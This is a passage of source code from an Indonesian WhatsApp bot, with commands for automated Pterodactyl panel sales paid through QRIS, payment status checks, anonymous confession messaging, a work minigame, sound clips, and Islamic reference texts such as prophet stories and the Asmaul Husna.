const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`)

const teks3 = `
*INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await client.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Order Panel`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await client.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await client.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_20",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `*Data Akun Panel Anda 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}*
* Disk : *${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}*
* CPU : *${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("./akunpanel.txt", tekspanel)
await client.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: tekspanel}, {quoted: null})
await fs.unlinkSync("./akunpanel.txt")
await client.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break
case 'cekinfo': {
        if (!isCreator) return reply(mess.owner)
    if (!args[0]) return reply('Masukkan nomor yang ingin dicek! Contoh: cekinfo 628xx');

    let nomor = args[0].replace(/[^0-9]/g, ''); // Membersihkan input
    if (!nomor) return reply('Nomor tidak valid!');

    // Cek nomor di WhatsApp
    let cek = await client.onWhatsApp(nomor + '@s.whatsapp.net');
    if (cek.length == 0) {
        return reply(`Nomor ${nomor} tidak terdaftar di WhatsApp.`);
    }

    let { jid, exists, notify, name } = cek[0]; // Ambil informasi akun nomor
    if (!exists) return reply(`Nomor ${nomor} tidak memiliki akun WhatsApp.`);

    try {
        // Informasi akun
        let infoFoto = await client.profilePictureUrl(jid, 'image').catch(() => 'https://i.ibb.co/DWLv1V7/default-avatar.png');
        let allGroups = await client.groupFetchAllParticipating(); // Semua grup bot
        let userGroups = Object.values(allGroups).filter(g => g.participants.includes(jid)); // Grup yang diikuti nomor
        let jumlahGrup = userGroups.length;

        // Tambahkan fallback untuk kontak & lokasi
        let jumlahKontak = 'Tidak diketahui'; // Kontak hanya bisa diambil jika tersinkron dengan bot
        let lokasi = 'Tidak tersedia';
        let versiWhatsApp = 'Versi WhatsApp: 2.23.21.1'; // Lokasi hanya bisa diperoleh jika berbagi lokasi aktif

        // Mengirim hasil
        reply(`*Informasi Nomor WhatsApp*\n\n` +
            `*Nomor:* ${nomor}\n` +
            `*Nama Akun:* ${name || 'Tidak tersedia'}\n` +  // Nama akun diambil dari nomor
            `*Nama Notifikasi:* ${notify || 'Tidak diketahui'}\n` +
            `*JID:* ${jid}\n\n` +
            `*Foto Profil:* ${infoFoto}\n` +
            `*Jumlah Grup:* ${jumlahGrup}\n` +
            `*Jumlah Kontak:* ${jumlahKontak}\n` +
            `*Versi WhatsApp:* ${versiWhatsApp}\n` +
            `*Lokasi:* ${lokasi}`);
    } catch (err) {
        console.error(err);
        reply('Gagal mengambil informasi akun. Pastikan nomor valid atau coba lagi nanti.');
    }
}
break;
        
 

case "thanksto": case "tqto": {
await reply(`*Thanks To The Supporter Of This Script :*

- Danny S8X
- Alwaysaqioo
- Tama Ryuichi
- Kaizi
- Kiraa
- DilxzXD`)
}
break
            
case 'confess': case 'confes': case 'menfes': case 'menfess':{
client.menfes = client.menfes ? client.menfes : {}
roof = Object.values(client.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (roof) return reply("Kamu masih berada dalam sesi menfess")
if (m.isGroup) return reply('Fitur Khusus Di private chat!')
if (!text) return reply(`Kirim Perintah ${prefix+command} nama|nomor|pesan\n\nContoh :\n${prefix+command} ${m.pushName}|628xxx|Pesan nya\n`)
if (!text.includes('|')) return reply(`Kirim Perintah ${prefix+command} nama|nomor|pesan\n\nContoh :\n${prefix+command} ${m.pushName}|628xx|Menfes nih\n`)
let [namaNya, nomorNya, pesanNya] = text.split`|`
if (nomorNya.startsWith('0')) return reply(`Kirim Perintah ${prefix+command} nama|nomor|pesan\n\nContoh :\n${prefix+command} ${m.pushName}|628xxx|Menfes nih\n`)
if(isNaN(nomorNya)) return reply(`Kirim Perintah ${prefix+command} nama|nomor|pesan\n\nContoh :\n${prefix+command} ${m.pushName}|628xxx|Menfes nih\n`)
var yoi = `Hi ada menfess nih buat kamu\n\nDari : ${namaNya}\nPesan : ${pesanNya}\n\nSilahkan ketik ${prefix}balasmenfess -- Untuk menerima menfess/confess\nSilahkan ketik ${prefix}tolakmenfess -- Untuk menolak menfess/confess\n\n_Pesan ini di tulis oleh seseorang pengguna bot, bot hanya menyampaikan saja_`
let tod = await getBuffer('https://telegra.ph/file/c8fdfc8426f5f60b48cca.jpg') 
let id = m.sender
client.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
 await client.sendMessage(nomorNya + '@s.whatsapp.net', {image: tod, caption:yoi }, {})
reply('Pesan berhasil dikirim ke nomor tujuan. Moga aja dibales coy')
}
break

case 'balasmenfess': {
    client.menfes = client.menfes ?? {};
    const roof = Object.values(client.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (!roof) return reply("Belum ada sesi menfess");

    const room = Object.values(client.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING');
    if (!room) return reply("Tidak ada sesi menfess yang sedang menunggu");

    const other = [room.a, room.b].find(user => user !== m.sender);
    room.b = m.sender;
    room.state = 'CHATTING';
    client.menfes[room.id] = { ...room };

    await client.sendMessage(other, {
        text: `_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini._\n\n*NOTE:* Ketik .stopmenfess untuk berhenti.`,
        mentions: [m.sender],
    });
    reply("Menfess diterima, sekarang kamu bisa chat!");
    reply("Silakan balas pesan langsung di chat ini. Semua pesan akan diteruskan.");
}
break;

case 'tolakmenfess': {
    client.menfes = client.menfes ?? {};
    const roof = Object.values(client.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (!roof) return reply("Belum ada sesi menfess");

    const other = [roof.a, roof.b].find(user => user !== m.sender);
    await client.sendMessage(other, {
        text: `_Maaf, @${m.sender.split("@")[0]} menolak menfess kamu._`,
        mentions: [m.sender],
    });
    reply("Menfess berhasil ditolak.");
    delete client.menfes[roof.id];
}
break;

case 'stopmenfess': {
    client.menfes = client.menfes ?? {};
    const find = Object.values(client.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (!find) return reply("Belum ada sesi menfess");

    const to = find.a === m.sender ? find.b : find.a;
    await client.sendMessage(to, {
        text: "_Sesi menfess ini telah dihentikan._",
        mentions: [m.sender],
    });
    reply("Sesi menfess dihentikan.");
    delete client.menfes[find.id];
}
break;

case "cekstatus": case "cek-status": {
if (!isCreator) return reply(mess.owner)
let t = text.split(",");
if (t.length < 3) return reply(`Contoh:\nid,reff pesanan,id produk`)
let id = t[0]
let reff = t[1]
let pr = t[2]
const proses = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&pin=${global.pinorkut}&password=${global.pworkut}&product=${pr}&dest=${id}&refID=${reff}`);
reply(proses);
}
break

case "ceksaldo-orkut": {
if (!isCreator) return reply(mess.owner);
const url = `https://h2h.okeconnect.com/trx/balance?memberID=${global.IdMerchant}&pin=${global.pinorkut}&password=${global.pworkut}`
const res = await fetchJson(url);
const bejirrsultan = `
Berikut Adalah Saldo Orkut Anda ❗

 *• Merchant :* ${global.IdMerchant}
 *• Balance :* ${res}
`
reply(bejirrsultan)
}
break;

case "cekmutasi": case "mutasi": {
if (!isCreator) return reply(mess.owner);
try {
const url = `https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`;
const response = await axios.get(url);

const transaksi = response.data || {};
if (transaksi.date) {
const tanggal = transaksi.date || "Tidak tersedia";
const nominal = transaksi.amount || "Tidak tersedia";
const jenis = transaksi.type || "Tidak tersedia";
const qris = transaksi.qris || "Tidak tersedia";
const namaBrand = transaksi.brand_name || "Tidak tersedia";
const issuerRef = transaksi.issuer_reff || "Tidak tersedia";
const buyerRef = transaksi.buyer_reff || "Tidak tersedia";
const saldo = transaksi.balance || "Tidak tersedia";

const caption = `
*▧ MUTASI TRANSAKSI*

 *• Tanggal :* ${tanggal}
 *• Nominal :* ${nominal}
 *• Jenis :* ${jenis}
 *• QRIS :* ${qris}
 *• Nama Brand :* ${namaBrand}
 *• Issue Reff :* ${issuerRef}
 *• Buyer Reff :* ${buyerRef}
 *• Balance :* ${saldo}
 
Berikut ini adalah hasil dari transaksi terakhir.`

reply(caption);
} else {
console.error("Response tidak valid:", transaksi);
reply("Gagal mendapatkan informasi transaksi. Coba lagi nanti.");
}
} catch (error) {
console.error("Error saat mengecek mutasi transaksi:", error.message);
reply("Terjadi kesalahan saat mengecek mutasi transaksi. Silakan coba lagi.");
}
}
break;

case 'kerja':
case 'bekerja': {
  if (!m.isGroup) return reply(mess.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let type = (args[0] || '').toLowerCase()
    let users = global.db.users[m.sender]
    let time = users.lastkerja + 30000
    let __timers = (new Date - users.lastkerja)
    let _timers = (1000 - __timers)
    let timers = clockString(_timers)

    let penumpan = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]

    let daganga = ['wortel', 'sawi', 'selada', 'tomat', 'seledri', 'cabai', 'daging', 'ikan', 'ayam']
    let dagangan = daganga[Math.floor(Math.random() * daganga.length)]
    
    let pasie = ['sakit kepala', 'cedera', 'luka bakar', 'patah tulang']
    let pasien = pasie[Math.floor(Math.random() * pasie.length)]

    let pane = ['Wortel', 'Kubis', 'stowbery', 'teh', 'padi', 'jeruk', 'pisang', 'semangka', 'durian', 'rambutan']
    let panen = pane[Math.floor(Math.random() * pane.length)]

    let bengke = ['mobil', 'motor', 'becak', 'bajai', 'bus', 'angkot', 'becak', 'sepeda']
    let bengkel = bengke[Math.floor(Math.random() * bengke.length)]

    let ruma = ['Membangun Rumah', 'Membangun Gedung', 'Memperbaiki Rumah', 'Memperbaiki Gedung', 'Membangun Fasilitas Umum', 'Memperbaiki Fasilitas Umum']
    let rumah = ruma[Math.floor(Math.random() * ruma.length)]

    if (/kerja/i.test(command)) {
        switch (type) {
            case 'ojek':
if (new Date - users.lastkerja < 300000) return reply(`Kamu sudah bekerja\nSaatnya istirahat selama ${clockString(time - new Date())}`)
let hasilojek = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilojek * 1
	              users.lastparming = new Date * 1
reply(`Kamu Sudah Mengantarkan *${penumpang}* 🚗\nDan mendapatkan uang senilai *Rp ${hasilojek} ('money')*`)
break
            case 'pedagang':
if (new Date - users.lastkerja < 300000) return reply(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasildagang = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasildagang * 1
	              users.lastparming = new Date * 1
reply(`Ada pembeli yg membeli *${dagangan}* 🛒\nDan mendapatkan uang senilai *Rp ${hasildagang} ('money')*`)
break
            case 'dokter':
if (new Date - users.lastkerja < 300000) return reply(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasildokter = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasildokter * 1
	              users.lastparming = new Date * 1
reply(`Kamu menyembuhkan pasien *${pasien}* 💉\nDan mendapatkan uang senilai *Rp ${hasildokter}* ('money')`)
break
            case 'petani':
if (new Date - users.lastkerja < 300000) return reply(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasiltani = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasiltani * 1
	              users.lastparming = new Date * 1
reply(`${panen} Sudah Panen !🌽 Dan menjualnya 🧺\nDan mendapatkan uang senilai Rp *${hasiltani} ('money')*`)
break
            case 'montir':
if (new Date - users.lastkerja < 300000) return reply(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasilmontir = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilmontir * 1
	              users.lastparming = new Date * 1
reply(`Kamu Baru saja mendapatkan pelanggan dan memperbaiki *${bengkel} 🔧*\nDan kamu mendapatkan uang senilai *Rp ${hasilmontir}* ('money')`)
break
            case 'kuli':
if (new Date - users.lastkerja < 300000) return reply(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasilkuli = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilkuli * 1
	              users.lastparming = new Date * 1
reply(`Kamu baru saja selesai ${rumah} 🔨\nDan mendapatkan uang senilai *Rp ${hasilkuli} ('money')*`)
break
            default:
return reply(`_*Pilih Pekerjaan Yang Kamu Inginkan*_\n\n_• Kuli_ \n_• Montir_ \n_• Petani_ \n_• Dokter_ \n_• Pedagang_ \n_• Ojek_ \n\nContoh Penggunaan :\nkerja Kuli`)
        }
    }
}
break

case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
case 'mangkane1':
case 'mangkane2':
case 'mangkane3':
case 'mangkane4':
case 'mangkane5':
case 'mangkane6':
case 'mangkane7':
case 'mangkane8':
case 'mangkane9':
case 'mangkane10':
case 'mangkane11':
case 'mangkane12':
case 'mangkane13':
case 'mangkane14':
case 'mangkane15':
case 'mangkane16':
case 'mangkane17':
case 'mangkane18':
case 'mangkane19':
case 'mangkane20':
case 'mangkane21':
case 'mangkane22':
case 'mangkane23':
case 'mangkane24':
case 'mangkane25':
case 'mangkane26':
case 'mangkane27':
case 'mangkane28':
case 'mangkane29':
case 'mangkane30':
case 'mangkane31':
case 'mangkane32':
case 'mangkane33':
case 'mangkane34':
case 'mangkane35':
case 'mangkane36':
case 'mangkane37':
case 'mangkane38':
case 'mangkane39':
case 'mangkane40':
case 'mangkane41':
case 'mangkane42':
case 'mangkane43':
case 'mangkane44':
case 'mangkane45':
case 'mangkane46':
case 'mangkane47':
case 'mangkane48':
case 'mangkane49':
case 'mangkane50':
case 'mangkane51':
case 'mangkane52':
case 'mangkane53':
case 'mangkane54':
case 'acumalaka':
case 'reza-kecap':
case 'farhan-kebab':
case 'omaga':
case 'kamu-nanya':
case 'anjay':
case 'siuu':
viot = 'https://telegra.ph/file/48b67f699cfa231e4d5c2.jpg'
thumb = 'https://telegra.ph/file/48b67f699cfa231e4d5c2.jpg'
let sound
if (/sound/.test(command)) sound = `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
if (/mangkane/.test(command) && command.replace('mangkane', '') < 25) sound = `https://raw.githubusercontent.com/hyuura/Rest-Sound/main/HyuuraKane/${command}.mp3`
if (/mangkane/.test(command) && command.replace('mangkane', '') > 24) sound = `https://raw.githubusercontent.com/aisyah-rest/mangkane/main/Mangkanenya/${command}.mp3`
if (/acumalaka|reza-kecap|farhan-kebab|omaga|omaga|kamu-nanya|anjay|siuu/.test(command)) sound = `https://github.com/FahriAdison/Base-Sound/raw/main/audio/${command}.mp3`
if (text.toLowerCase() === 'thumb') {
await client.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: false, 
contextInfo: {
externalAdreply: {
mediaUrl: 'https://instagram.com/Cyaa_ches1', 
mediaType: 2, 
title: '  ⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻  ', 
body: '  ━━━━⬤──────────  ', 
description: 'Now Playing...',
mediaType: 2, 
sourceUrl: 'https://instagram.com/Cyaa_ches1',
thumbnail: await (await fetch(viot)).buffer(), 
renderLargerThumbnail: true}}}, {quoted: loli})
} else await client.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: false}, {quoted: loli})
break

case 'kisahnabi': {
     if (!text) return reply(`Masukan nama nabi\nExample: kisahnabi adam`)
     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return reply("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
     
    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

     reply(`${hasil}`)

}
break

const contoh = `*Asmaul Husna*
`
// data here
const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`

case 'asmaulhusna': {
const asmaulhusna = [
    {
        index: 1,
        latin: "Ar Rahman",
        arabic: "الرَّحْمَنُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemurah",
        translation_en: "The All Beneficent"
    },
    {
        index: 2,
        latin: "Ar Rahiim",
        arabic: "الرَّحِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Penyayang",
        translation_en: "The Most Merciful"
    },
    {
        index: 3,
        latin: "Al Malik",
        arabic: "الْمَلِكُ",
        translation_id: "Yang Memiliki Mutlak sifat Merajai/Memerintah",
        translation_en: "The King, The Sovereign"
    },
    {
        index: 4,
        latin: "Al Quddus",
        arabic: "الْقُدُّوسُ",
        translation_id: "Yang Memiliki Mutlak sifat Suci",
        translation_en: "The Most Holy"
    },
    {
        index: 5,
        latin: "As Salaam",
        arabic: "السَّلاَمُ",
        translation_id: "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
        translation_en: "Peace and Blessing"
    },
    {
        index: 6,
        latin: "Al Mu’min",
        arabic: "الْمُؤْمِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
        translation_en: "The Guarantor"
    },
    {
        index: 7,
        latin: "Al Muhaimin",
        arabic: "الْمُهَيْمِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
        translation_en: "The Guardian, the Preserver"
    },
    {
        index: 8,
        latin: "Al ‘Aziiz",
        arabic: "الْعَزِيزُ",
        translation_id: "Yang Memiliki Mutlak Kegagahan",
        translation_en: "The Almighty, the Self Sufficient"
    },
    {
        index: 9,
        latin: "Al Jabbar",
        arabic: "الْجَبَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Perkasa",
        translation_en: "The Powerful, the Irresistible"
    },
    {
        index: 10,
        latin: "Al Mutakabbir",
        arabic: "الْمُتَكَبِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
        translation_en: "The Tremendous"
    },
    {
        index: 11,
        latin: "Al Khaliq",
        arabic: "الْخَالِقُ",
        translation_id: "Yang Memiliki Mutlak sifat Pencipta",
        translation_en: "The Creator"
    },
    {
        index: 12,
        latin: "Al Baari’",
        arabic: "الْبَارِئُ",
        translation_id: "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
        translation_en: "The Maker"
    },
    {
        index: 13,
        latin: "Al Mushawwir",
        arabic: "الْمُصَوِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
        translation_en: "The Fashioner of Forms"
    },
    {
        index: 14,
        latin: "Al Ghaffaar",
        arabic: "الْغَفَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Pengampun",
        translation_en: "The Ever Forgiving"
    },
    {
        index: 15,
        latin: "Al Qahhaar",
        arabic: "الْقَهَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Memaksa",
        translation_en: "The All Compelling Subduer"
    },
    {
        index: 16,
        latin: "Al Wahhaab",
        arabic: "الْوَهَّابُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
        translation_en: "The Bestower"
    },
    {
        index: 17,
        latin: "Ar Razzaaq",
        arabic: "الرَّزَّاقُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
        translation_en: "The Ever Providing"
    },
    {
        index: 18,
        latin: "Al Fattaah",
        arabic: "الْفَتَّاحُ",
        translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
        translation_en: "The Opener, the Victory Giver"
    },
    {
        index: 19,
        latin: "Al ‘Aliim",
        arabic: "اَلْعَلِيْمُ",
        translation_id: "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
        translation_en: "The All Knowing, the Omniscient"
    },
    {
        index: 20,
        latin: "Al Qaabidh",
        arabic: "الْقَابِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
        translation_en: "The Restrainer, the Straightener"
    },
    {
        index: 21,
        latin: "Al Baasith",
        arabic: "الْبَاسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
        translation_en: "The Expander, the Munificent"
    },
    {
        index: 22,
        latin: "Al Khaafidh",
        arabic: "الْخَافِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
        translation_en: "The Abaser"
    },
    {
        index: 23,
        latin: "Ar Raafi’",
        arabic: "الرَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
        translation_en: "The Exalter"
    },
    {
        index: 24,
        latin: "Al Mu’izz",
        arabic: "الْمُعِزُّ",
        translation_id: "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
        translation_en: "The Giver of Honor"
    },
    {
        index: 25,
        latin: "Al Mudzil",
        arabic: "المُذِلُّ",
        translation_id: "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
        translation_en: "The Giver of Dishonor"
    },
    {
        index: 26,
        latin: "Al Samii’",
        arabic: "السَّمِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
        translation_en: "The All Hearing"
    },
    {
        index: 27,
        latin: "Al Bashiir",
        arabic: "الْبَصِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
        translation_en: "The All Seeing"
    },
    {
        index: 28,
        latin: "Al Hakam",
        arabic: "الْحَكَمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
